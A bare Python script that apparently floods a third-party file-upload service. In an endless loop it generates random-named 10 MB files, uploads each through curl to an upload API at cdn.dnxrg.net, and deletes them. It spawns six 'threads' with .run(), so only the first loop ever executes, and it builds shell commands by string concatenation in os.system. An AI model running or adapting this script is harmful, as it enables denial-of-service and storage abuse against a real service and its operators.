import os
import time
import random
import threading
low_word = "abcdefghijklkmnopqrstuvwxyz"
username_for = low_word
long_username = 12
def rawr():
    while True:
        usernamerepl = "".join(random.sample(username_for, long_username))
        os.system("fallocate -l 10M "+usernamerepl)
        os.system("curl --form myFile='@"+usernamerepl+"' https://cdn.dnxrg.net/api/upload")
        os.system("rm "+usernamerepl)
        
        
thread1 = threading.Thread(target=rawr)
thread2 = threading.Thread(target=rawr)
thread3 = threading.Thread(target=rawr)
thread4 = threading.Thread(target=rawr)
thread5 = threading.Thread(target=rawr)
thread6 = threading.Thread(target=rawr)
thread1.run()
thread2.run()
thread3.run()
thread4.run()
thread5.run()
thread6.run()
while True:
    time.sleep(10)
    print("up")
